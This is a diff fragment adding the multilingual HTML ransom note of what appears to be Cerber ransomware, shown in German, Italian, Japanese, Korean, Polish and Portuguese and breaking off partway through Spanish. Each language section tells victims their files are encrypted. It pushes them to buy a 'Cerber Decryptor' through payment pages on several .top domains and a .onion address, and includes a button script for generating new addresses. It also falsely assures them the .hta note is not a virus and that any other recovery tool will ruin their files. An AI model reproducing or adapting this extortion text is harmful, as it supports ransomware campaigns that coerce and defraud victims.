+				<p><span class="info"><span class="updating">Warten Sie mal...</span><a class="url" href="http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123</a></span></p>
+				<p>Kann diese Seite nicht geöffnet werden, &nbsp;<span class="button" onclick="return updUrl('de');">klicken Sie hier</span>&nbsp; um eine neue Adresse für Ihre persönliche Seite zu generieren.</p>
+				<p>Auf dieser Seite erhalten Sie die kompletten Anweisungen für den Kauf der Entschlüsselungssoftware für die Wiederherstellung Ihrer Dateien.</p>
+				<p>Außerdem können Sie auf dieser Seite eine Ihrer Dateien wiederherstellen, um sich von der Funktion von "Cer&#98;er&nbsp;Decryptor" zu überzeugen.</p>
+				<hr>
+				<p>Falls Ihre persönliche Seite über einen längeren Zeitraum nicht verfügbar ist, gibt es eine andere Möglichkeit, Ihre persönliche Seite zu öffnen - die Installation und Verwendung von Tor&nbsp;Browser:</p>
+				<ol>
+					<li>starten Sie Ihren Internet-Browser (falls Sie nicht wissen, welcher das ist, starten Sie den Internet&nbsp;Explorer);</li>
+					<li>geben oder kopieren Sie die Adresse <a href="https://www.torproject.org/download/download-easy.html.en" target="_blank">https://www.torproject.org/download/download-easy.html.en</a> in die Adressleiste Ihres Browsers ein und drücken Sie ENTER;</li>
+					<li>warten Sie, bis die Seite geladen ist;</li>
+					<li>auf der Seite wird Ihnen der Download von Tor&nbsp;Browser angeboten; diesen herunterladen und ausführen, folgen Sie den Installationsanweisungen und warten Sie, bis die Installation abgeschlossen ist;</li>
+					<li>starten Sie Tor&nbsp;Browser;</li>
+					<li>stellen Sie über die Schaltfläche "Verbinden" eine Verbindung her (bei Verwendung der englischsprachigen Version);</li>
+					<li>nach der Initialisierung wird ein reguläres Internet-Browserfenster geöffnet;</li>
+					<li>tippen oder kopieren Sie die Adresse <br><span class="info">http://p27dokhpz2n7nvgr.onion/0123-4567-89AB-CDEF-0123</span><br> in diese Browser-Adressleiste;</li>
+					<li>drücken Sie ENTER;</li>
+					<li>die Seite sollte nun geladen werden; wird die Seite aus irgendeinem Grund nicht geladen, warten Sie einen Moment und versuchen Sie es erneut.</li>
+				</ol>
+				<p>Falls Sie während der Installation von Tor&nbsp;Browser Probleme haben, besuchen Sie bitte <a href="https://www.youtube.com/results?search_query=Install+Tor+Browser+Windows" target="_blank">https://www.youtube.com</a> und geben als Suchanforderung "tor browser Windows installieren" ein und Sie erhalten in den Suchergebnossen viele Anleitungsvideos über die Installation und Verwendung von Tor&nbsp;Browser.</p>
+				<hr>
+				<p><strong>Zusätzliche Informationen:</strong></p>
+				<p>Sie finden dann die Anweisungen für die Wiederherstellung der Dateien ("*_READ_THIS_FILE_*.hta") in jedem Ordner mit Ihren verschlüsselten Dateien.</p>
+				<p>Bei den Anweisungen ("*_READ_THIS_FILE_*.hta") in den Ordnern mit Ihren verschlüsselten Dateien handelt es sich nicht um Viren, die Anweisungen ("*_READ_THIS_FILE_*.hta") unterstützen Sie bei der Entschlüsselung Ihrer Dateien.</p>
+				<p>Denken Sie daran, das Schlimmste haben Sie bereits hinter ich und nun liegt die Zukunft Ihrer Dateien in den Händen Ihrer Entschlossenheit und Ihrer Aktionsschnelligkeit.</p>
+			</div>
+			<div id="it">
+				<p>Non riesci a trovare i file necessari?<br>Il contenuto dei tuoi file non è leggibile?</p>
+				<p>È normale, in quanto i nomi dei file e i dati in essi contenuti sono stati cifrati da "Cer&#98;er&nbsp;Rans&#111;mware".</p>
+				<p>Ciò significa che i file NON sono danneggiati! I tuoi file sono stati soltanto modificati. Questa modifica è reversibile. Da ora in poi non sarà possibile utilizzare i file fin quando non saranno decifrati.</p>
+				<p>L'unico modo per decifrare in maniera sicura i tuoi file è acquistare lo speciale software di decodifica "Cer&#98;er&nbsp;Decryptor".</p>
+				<p>Qualsiasi tentativo di ripristino utilizzando software di terzi potrebbe risultare fatale per i tuoi file!</p>
+				<hr>
+				<p>È possibile procedere con l'acquisto del software di decodifica sulla tua pagina personale:</p>
+				<p><span class="info"><span class="updating">Attendere prego...</span><a class="url" href="http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123</a></span></p>
+				<p>Se non risulta possibile aprire questa pagina, &nbsp;<span class="button" onclick="return updUrl('it');">fare clic qui</span>&nbsp; per generare un nuovo indirizzo e accedere alla pagina personale.</p>
+				<p>In questa pagina sono fornite le istruzioni complete per acquistare il software di decodifica che permetterà di ripristinare tutti i tuoi file.</p>
+				<p>In questa pagina è inoltre possibile ripristinare a titolo gratuito uno solo dei file, in modo da assicurarsi che "Cer&#98;er&nbsp;Decryptor" potrà essere di aiuto.</p>
+				<hr>
+				<p>Se la propria pagina personale non è disponibile per un periodo di tempo prolungato, è possibile aprirla seguendo un metodo alternativo - installazione e uso di Tor&nbsp;Browser:</p>
+				<ol>
+					<li>lanciare il browser Internet (se non si è a conoscenza del browser utilizzato, lanciare Internet&nbsp;Explorer);</li>
+					<li>immettere o copiare l'indirizzo <a href="https://www.torproject.org/download/download-easy.html.en" target="_blank">https://www.torproject.org/download/download-easy.html.en</a> nella barra degli indirizzi del browser e premere INVIO;</li>
+					<li>attendere che il sito venga caricato;</li>
+					<li>sul sito proporrà di scaricare Tor&nbsp;Browser; scaricarlo ed eseguirlo, seguire le istruzioni di installazione e attendere che la procedura di installazione sia completata;</li>
+					<li>eseguire Tor&nbsp;Browser;</li>
+					<li>connettersi con il pulsante "Connect" (se si utilizza la versione inglese);</li>
+					<li>al termine dell'inizializzazione si aprirà una normale finestra del browser Internet;</li>
+					<li>digitare o copiare l'indirizzo <br><span class="info">http://p27dokhpz2n7nvgr.onion/0123-4567-89AB-CDEF-0123</span><br> nella barra degli indirizzi di questo browser;</li>
+					<li>premere INVIO;</li>
+					<li>il sito dovrebbe essere caricato; se per qualsiasi motivo il sito non viene caricato, attendere alcuni istanti e riprovare.</li>
+				</ol>
+				<p>Se si riscontrano problemi durante l'installazione o l'utilizzo di Tor&nbsp;Browser, visitare <a href="https://www.youtube.com/results?search_query=Install+Tor+Browser+Windows" target="_blank">https://www.youtube.com</a> e immettere "install tor browser windows" nella barra di ricerca per trovare numerosi video esplicativi sull'installazione e utilizzo di Tor&nbsp;Browser.</p>
+				<hr>
+				<p><strong>Ulteriori informazioni:</strong></p>
+				<p>Le istruzioni per il ripristino dei file sono disponibili in qualsiasi cartella contenente file cifrati ("*_READ_THIS_FILE_*.hta").</p>
+				<p>Le istruzioni ("*_READ_THIS_FILE_*.hta") presenti nelle cartelle contenenti i file cifrati non sono virus. Al contrario, le istruzioni ("*_READ_THIS_FILE_*.hta") ti aiuteranno a decifrare i tuoi file.</p>
+				<p>Ricorda, il peggio è già passato e il futuro dei tuoi file dipende ora dalla tua determinazione e dalla rapidità con cui agirai.</p>
+			</div>
+			<div id="ja">
+				<p>必要なファイルが、見つかりませんか？<br>ファイルの内容が、読み取れませんか？</p>
+				<p>ファイル名およびファイルの内容が "Cer&#98;er&nbsp;Rans&#111;mware" によって暗号化されているので、それは正常です。</p>
+				<p>つまり、ファイルが壊れているわけではありません！ ファイルが変更されているだけです。 この変更は、元に戻せます。 ここからは、復号化しない限り、ファイルを使えなくなります。</p>
+				<p>ファイルを安全に復号化できる唯一の方法は、特別な復号化ソフトウェア "Cer&#98;er&nbsp;Decryptor" を購入することです。</p>
+				<p>サードパーティのソフトウェアでファイルを復元しようと試みると、ファイルが壊れます！</p>
+				<hr>
+				<p>復号化ソフトウェアは、パーソナルページで購入できます:</p>
+				<p><span class="info"><span class="updating">お待ちください...</span><a class="url" href="http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123</a></span></p>
+				<p>このページを開けない場合は、 &nbsp;<span class="button" onclick="return updUrl('ja');">ここをクリック</span>&nbsp; すると、あなたのパーソナルページの新しいアドレスが作成されます。</p>
+				<p>このページで、すべてのファイルを復元するために復号化ソフトウェアを購入する方法の説明を受け取ってください。</p>
+				<p>また、このページで、"Cer&#98;er&nbsp;Decryptor" がどれだけ役立つかを確認していただくために、無料で 1 つのファイルの復元を試すこともできます。</p>
+				<hr>
+				<p>パーソナルページを長期間使用していなかった場合、パーソナルページを開く別の方法もあります - Tor ブラウザのインストールと使用:</p>
+				<ol>
+					<li>インターネットブラウザの実行 (Internet&nbsp;Explorer の実行方法をご存知でない場合);</li>
+					<li>アドレス <a href="https://www.torproject.org/download/download-easy.html.en" target="_blank">https://www.torproject.org/download/download-easy.html.en</a> を、ブラウザのアドレスバーに直接入力するか、コピーして貼り付け、[ENTER] を押します;</li>
+					<li>サイトが読み込まれるのを待ちます;</li>
+					<li>サイトで、「Tor ブラウザのダウンロード」が提供されます。ダウンロードして、起動します。インストールの指示に従い、インストールの完了を待ちます;</li>
+					<li>Tor ブラウザを実行します;</li>
+					<li>[Connect] ボタンで接続します(英語版を使用されている場合);</li>
+					<li>初期化が済むと、通常のインターネットブラウザのウィンドウが開きます;</li>
+					<li>このブラウザのアドレスバーに、 <br><span class="info">http://p27dokhpz2n7nvgr.onion/0123-4567-89AB-CDEF-0123</span><br> を入力、またはコピーします;</li>
+					<li>[ENTER] を押します;</li>
+					<li>サイトが読み込まれるはずです。なんらかの理由で、サイトが読み込まれない場合は、しばらく待ってから、再度試みてください。</li>
+				</ol>
+				<p>Tor ブラウザのインストールや使用の際に問題があった場合は、<a href="https://www.youtube.com/results?search_query=Install+Tor+Browser+Windows" target="_blank">https://www.youtube.com</a> にアクセスして、検索バー [install tor browser windows （Tor ブラウザウィンドウのインストール）] にリクエストを入力すると、Tor ブラウザのインストールや使用に関する多数のトレーニング用動画があります。</p>
+				<hr>
+				<p><strong>追加情報:</strong></p>
+				<p>暗号化されたファイルがあるフォルダには、ファイルの復元に関する指示があります ("*_READ_THIS_FILE_*.hta")。</p>
+				<p>暗号化されたファイルがあるフォルダにある指示 ("*_READ_THIS_FILE_*.hta") はウイルスではありません。この指示 ("*_READ_THIS_FILE_*.hta") は、ファイルの復号化に役立ちます。</p>
+				<p>最悪の状況が発生していて、あなたのファイルの今後は、あなたの決断と素早いアクションにかかっていることをお忘れなく。</p>
+			</div>
+			<div id="ko">
+				<p>﻿필요한 파일들을 찾을 수 없습니까?<br>파일들의 내용을 읽을 수 없습니까?</p>
+				<p>파일들의 이름과 안에 있는 데이터가 "Cer&#98;er&nbsp;Rans&#111;mware"(으)로 암호화되어 있으니 이 문제는 정상인 셈입니다.</p>
+				<p>즉 파일들이 훼손되지 않았다는 뜻입니다! 파일들은 수정만 되었을 뿐입니다. 그리고 수정 사항은 원래대로 되돌릴 수 있습니다. 지금부터는 암호를 해독할 때까지 해당 파일들은 사용하실 수 없습니다.</p>
+				<p>파일들을 안전하게 해독할 수 있는 유일한 방법은 특별 암호 해독 소프트웨어인  "Cer&#98;er&nbsp;Decryptor"을(를) 구매하시는 것입니다.</p>
+				<p>타사 소프트웨어로 파일들을 복원하려는 시도는 해당 파일들에 치명적인 문제를 초래할 뿐입니다!</p>
+				<hr>
+				<p>귀하의 개인 페이지에서 암호 해독 소프트웨어를 구매하실 수 있습니다:</p>
+				<p><span class="info"><span class="updating">잠시 기다려주십시오 ...</span><a class="url" href="http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123</a></span></p>
+				<p>이 페이지가 열리지 않으면 &nbsp;<span class="button" onclick="return updUrl('ko');">이곳을 클릭</span>&nbsp; 해서 귀하의 개인 페이지에 대한 새로운 주소를 생성하시기 바랍니다.</p>
+				<p>이 페이지에 모든 파일을 복구할 수 있는 암호 해독 소프트웨어의 구매 방법이 자세히 설명되어 있습니다.</p>
+				<p>그리고 이 페이지에서 "Cer&#98;er&nbsp;Decryptor"이(가) 확실히 귀하를 도와드릴 수 있음을 보여주기 위해서 한 개의 파일을 무료로 복원하실 수 있습니다.</p>
+				<hr>
+				<p>귀하의 개인 페이지가 오랫동안 열리지 않는다면 다른 방법으로 여실 수도 있습니다. 바로 Tor&nbsp;Browser를 설치해서 사용하는 것입니다:</p>
+				<ol>
+					<li>인터넷 브라우저를 실행합니다(어떤 것인지 모르실 경우 Internet&nbsp;Explorer를 실행하십시오);</li>
+					<li><a href="https://www.torproject.org/download/download-easy.html.en" target="_blank">https://www.torproject.org/download/download-easy.html.en</a> 을 브라우저의 주소 창에 입력하거나 복사해 넣은 후 ENTER 키를 누릅니다;</li>
+					<li>사이트가 로드될 때까지 기다립니다;</li>
+					<li>사이트에서 Tor&nbsp;Browser를 다운로드하라는 요청이 있으면 다운로드 및 실행한 후 설치 안내에 따르고 설치가 완료될 때까지 기다립니다;</li>
+					<li>Tor&nbsp;Browser를 실행합니다;</li>
+					<li>(영어 버전을 이용하는 경우) "Connect" 버튼을 눌러 연결합니다;</li>
+					<li>초기화가 수행된 후 일반적인 인터넷 브라우저 창이 열립니다;</li>
+					<li>이 브라우저의 주소 창에 <br><span class="info">http://p27dokhpz2n7nvgr.onion/0123-4567-89AB-CDEF-0123</span><br> 을 입력하거나 복사해 넣습니다;</li>
+					<li>ENTER 키를 누릅니다;</li>
+					<li>사이트가 로드됩니다. 어떤 이유에서든 사이트가 로드되지 않으면 잠시 기다린 후 다시 시도하십시오.</li>
+				</ol>
+				<p>Tor&nbsp;Browser의 설치 또는 사용 중 문제가 있으면 <a href="https://www.youtube.com/results?search_query=Install+Tor+Browser+Windows" target="_blank">https://www.youtube.com</a> 을 방문해서 검색 창에 "install tor browser windows"라고 입력하시면 Tor&nbsp;Browser의 설치 및 사용에 관한 동영상을 많이 확인하실 수 있습니다.</p>
+				<hr>
+				<p><strong>추가 정보:</strong></p>
+				<p>암호화된 파일들이 속한 폴더에서 파일 복원에 관한 설명 문서 ("*_READ_THIS_FILE_*.hta") 를 보실 수 있습니다.</p>
+				<p>암호화된 파일들이 속한 폴더 안의 설명 문서 ("*_READ_THIS_FILE_*.hta") 는 바이러스가 아닙니다. 설명 문서 ("*_READ_THIS_FILE_*.hta") 가 파일들의 암호 해독을 도와드릴 것입니다.</p>
+				<p>최악의 상황은 이미 발생했으며 앞으로 파일들의 운명은 귀하의 판단과 빠른 조치에 달려있음을 명심하시기 바랍니다.</p>
+			</div>
+			<div id="pl">
+				<p>Nie możesz znaleźć potrzebnych plików?<br>Zawartość twoich plików jest nieczytelna?</p>
+				<p>To normalne, ponieważ nazwy twoich plików i znajdujące się w nich dane zostały zaszyfrowane przez „Cer&#98;er&nbsp;Rans&#111;mware”.</p>
+				<p>To NIE znaczy, że pliki są uszkodzone! Twoje pliki są tylko modyfikowane. Modyfikację można cofnąć. Od tej pory twoich plików będzie można używać dopiero po ich rozszyfrowaniu.</p>
+				<p>Jedynym sposobem na bezpieczne rozszyfrowanie twoich plików jest kupienie specjalnego programu „Cer&#98;er&nbsp;Decryptor”.</p>
+				<p>Wszelkie próby rozszyfrowania twoich plików za pomocą innych programów zakończą się fatalnie dla tych plików!</p>
+				<hr>
+				<p>Możesz kontynuować składanie zamówienia na oprogramowanie deszyfrujące na swojej osobistej stronie:</p>
+				<p><span class="info"><span class="updating">Proszę czekać...</span><a class="url" href="http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123</a></span></p>
+				<p>Jeśli strona nie działa, &nbsp;<span class="button" onclick="return updUrl('pl');">kliknij tutaj</span>&nbsp; aby wygenerować nowy adres do swojej osobistej strony.</p>
+				<p>Na stronie tej otrzymasz kompletne instrukcje, jak kupić program deszyfrujący do swoich plików.</p>
+				<p>Ponadto możesz rozszyfrować dowolny plik za darmo, aby upewnić się, że program „Cer&#98;er&nbsp;Decryptor” Ci pomoże.</p>
+				<hr>
+				<p>Jeśli twoja strona osobista jest niedostępna przez długi czas, możesz się do niej dostać innym sposobem — instalując przeglądarkę Tor&nbsp;Browser:</p>
+				<ol>
+					<li>uruchom swoją przeglądarkę internetową (jeśli nie wiesz, co to jest, uruchom Internet&nbsp;Explorera);</li>
+					<li>wpisz albo skopiuj adres <a href="https://www.torproject.org/download/download-easy.html.en" target="_blank">https://www.torproject.org/download/download-easy.html.en</a> do paska adresu przeglądarki i naciśnij klawisz ENTER;</li>
+					<li>poczekaj na załadowanie strony;</li>
+					<li>na stronie tej będzie można pobrać przeglądarkę Tor&nbsp;Browser; pobierz i uruchom ją, a następnie postępuj zgodnie ze wskazówkami na ekranie. Poczekaj na zakończenie instalacji;</li>
+					<li>uruchom Tor&nbsp;Browser;</li>
+					<li>włącz połączenie za pomocą przycisku „Połącz” (w polskiej wersji);</li>
+					<li>po zakończeniu inicjalizacji zostanie wyświetlone normalne okno przeglądarki;</li>
+					<li>wpisz lub skopiuj adres <br><span class="info">http://p27dokhpz2n7nvgr.onion/0123-4567-89AB-CDEF-0123</span><br> do paska adresu przeglądarki;</li>
+					<li>naciśnij klawisz Enter;</li>
+					<li>strona powinna zostać załadowana; jeśli tak się nie stanie, odczekaj chwilę i spróbuj ponownie.</li>
+				</ol>
+				<p>Jeśli podczas instalacji lub użytkowania przeglądarki Tor&nbsp;Browser wystąpią problemy, wejdź do portalu <a href="https://www.youtube.com/results?search_query=Install+Tor+Browser+Windows" target="_blank">https://www.youtube.com</a> i wpisz w wyszukiwarce „install tor browser windows”, aby znaleźć filmy instruktażowe na temat instalowania i używania Tor&nbsp;Browser.</p>
+				<hr>
+				<p><strong>Informacje dodatkowe:</strong></p>
+				<p>Instrukcje, jak przywrócić swoje pliki („*_READ_THIS_FILE_*.hta”) w każdym folderze z zaszyfrowanymi plikami.</p>
+				<p>Instrukcje („*_READ_THIS_FILE_*.hta”) w folderach z zaszyfrowanymi plikami nie są wirusami. Zawierają informacje, jak rozszyfrować pliki.</p>
+				<p>Pamiętaj że najgorsze masz już za sobą i teraz przyszłość twoich plików zależy od twojej determinacji i szybkości działania.</p>
+			</div>
+			<div id="pt">
+				<p>Não consegue encontrar os ficheiros necessários?<br>O conteúdo dos seus ficheiros não é legível?</p>
+				<p>É normal, porque os nomes dos ficheiros e os dados nos seus ficheiros foram encriptados pela «Cer&#98;er&nbsp;Rans&#111;mware».</p>
+				<p>Significa que os seus ficheiros NÃO estão danificados! Os seus ficheiros foram apenas modificados. Esta modificação é reversível. A partir de agora, não é possível utilizar os seus ficheiros até serem desencriptados.</p>
+				<p>A única forma de desencriptar os seus ficheiros em segurança é comprar o software de desencriptação «Cer&#98;er&nbsp;Decryptor».</p>
+				<p>Quaisquer tentativas de restaurr os ficheiros com o software de terceiros será fatal para os seus ficheiros!</p>
+				<hr>
+				<p>Pode prosseguir com a compra do software de desencriptação na sua página pessoal:</p>
+				<p><span class="info"><span class="updating">Por favor, espere...</span><a class="url" href="http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123</a></span></p>
+				<p>Se não conseguir abrir esta página &nbsp;<span class="button" onclick="return updUrl('pt');">clique aqui</span>&nbsp; para gerar um novo endereço para a sua página pessoal.</p>
+				<p>Nesta página irá receber as instruções completas sobre como comprar o software de desencriptação para restaurar todos os seus ficheiros.</p>
+				<p>Para além disso, nesta página, poderá restaurar qualquer ficheiro gratuitamente para se certificar que o «Cer&#98;er&nbsp;Decryptor» irá ajudá-lo.</p>
+				<hr>
+				<p>Se a sua página pessoal não estiver disponível durante um longo período, existe outra forma de abrir a sua página pessoal - instalação e utilização do Tor&nbsp;Browser:</p>
+				<ol>
+					<li>execute o seu navegador da Internet (se não sabe qual é, execute o Internet&nbsp;Explorer);</li>
+					<li>introduza ou copie o endereço <a href="https://www.torproject.org/download/download-easy.html.en" target="_blank">https://www.torproject.org/download/download-easy.html.en</a> na sua barra de endereços do seu navegador e prima ENTER;</li>
+					<li>espere que o site carregue;</li>
+					<li>no site, irá ser-lhe oferecido descarregar o Tor&nbsp;Browser; descarregue-o e execute-o, siga as instruções de instalação, espere até a instalação estar completa;</li>
+					<li>execute o Tor&nbsp;Browser;</li>
+					<li>ligue com o botão “Ligar” (se utiliza a versão em inglês);</li>
+					<li>uma janela de navegador de Internet normal irá ser aberta após a inicialização;</li>
+					<li>insira ou copie o endereço <br><span class="info">http://p27dokhpz2n7nvgr.onion/0123-4567-89AB-CDEF-0123</span><br> nesta barra de endereços do navegador;</li>
+					<li>prima ENTER;</li>
+					<li>o site deve ser carregado; se, por algum motivo, o site não estiver a carregar, aguarde um momento e tente novamente.</li>
+				</ol>
+				<p>Caso tenha quaisquer problemas durante a instalação ou utilização do Tor&nbsp;Browser, visite <a href="https://www.youtube.com/results?search_query=Install+Tor+Browser+Windows" target="_blank">https://www.youtube.com</a> e insira o pedido na barra de pesquisa «instalar janelas Tor&nbsp;Browser» e irá encontrar imensos vídeos de formação sobre a instalação e utilização do Tor&nbsp;Browser.</p>
+				<hr>
+				<p><strong>Informações adicionais:</strong></p>
+				<p>Irá encontrar as instruções para restaurar os seus ficheiros ("*_READ_THIS_FILE_*.hta") em qualquer pasta com os seus ficheiros encriptados.</p>
+				<p>As instruções ("*_READ_THIS_FILE_*.hta") nas pastas com os seus ficheiros encriptados não são vírus, as instruções ("*_READ_THIS_FILE_*.hta") irão ajudá-lo a desencriptar os seus ficheiros.</p>
+				<p>Lembre-se que a pior situação já aconteceu e, agora, o futuro dos seus ficheiros depende da sua determinação e velocidade das suas ações.</p>
+			</div>
+			<div id="es">
+				<p>¿No puede encontrar los archivos que necesita?<br>¿No puede leer el contenido de sus archivos?</p>
+				<p>Es normal, porque los nombres de los archivos y los datos de sus archivos han sido cifrados por "Cer&#98;er&nbsp;Rans&#111;mware".</p>
+				<p>Significa que sus archivos NO están dañados. Sus archivos solo se han modificado. Esta modificación es reversible. Desde ahora, no es posible usar sus archivos hasta que sean descifrados.</p>
+				<p>La única forma de descifrar sus archivos de forma segura es comprar el software de descifrado especial "Cer&#98;er&nbsp;Decryptor".</p>
+				<p>Cualquier intento de restaurar sus archivos con el software externo será fatal para sus archivos!</p>
+				<hr>
+				<p>Puede continuar con la compra del software de descifrado en su página personal:</p>
+				<p><span class="info"><span class="updating">Por favor espera...</span><a class="url" href="http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123</a></span></p>
+				<p>Si no puede abrir esta página &nbsp;<span class="button" onclick="return updUrl('es');">haga clic aquí</span>&nbsp; para generar una nueva dirección a su página personal.</p>
+				<p>En esta página, recibirá las instrucciones completas sobre cómo comprar el software de descifrado para restaurar todos sus archivos.</p>
+				<p>Además, en esta página podrá restaurar cualquier archivo de forma gratuita para asegurarse de que "Cer&#98;er&nbsp;Decryptor" le ayudará.</p>
+				<hr>
+				<p>Si su página personal no está disponible durante un largo periodo, hay otra forma de abrir su página personal: la instalación y el uso del Navegador Tor:</p>
+				<ol>
+					<li>ejecute su navegador de Internet (si no sabe cuál es, ejecute Internet&nbsp;Explorer);</li>
+					<li>introduzca o copie la dirección <a href="https://www.torproject.org/download/download-easy.html.en" target="_blank">https://www.torproject.org/download/download-easy.html.en</a> en la barra de direcciones de su navegador y pulse ENTER;</li>
+					<li>espere que se cargue el sitio;</li>
+					<li>en el sitio, se le ofrecerá descargar el Navegador Tor; descárguelo y ejecútelo, siga las instrucciones de instalación, y espere hasta que ésta se haya completado;</li>
+					<li>ejecute el Navegador Tor;</li>
+					<li>conéctese con el botón Conectar (si usa la versión en español);</li>
+					<li>se abrirá una ventana del navegador de Internet tras la inicialización;</li>
+					<li>escriba o copie la dirección <br><span class="info">http://p27dokhpz2n7nvgr.onion/0123-4567-89AB-CDEF-0123</span><br> en la barra de direcciones de este navegador;</li>
+					<li>pulse ENTER;</li>
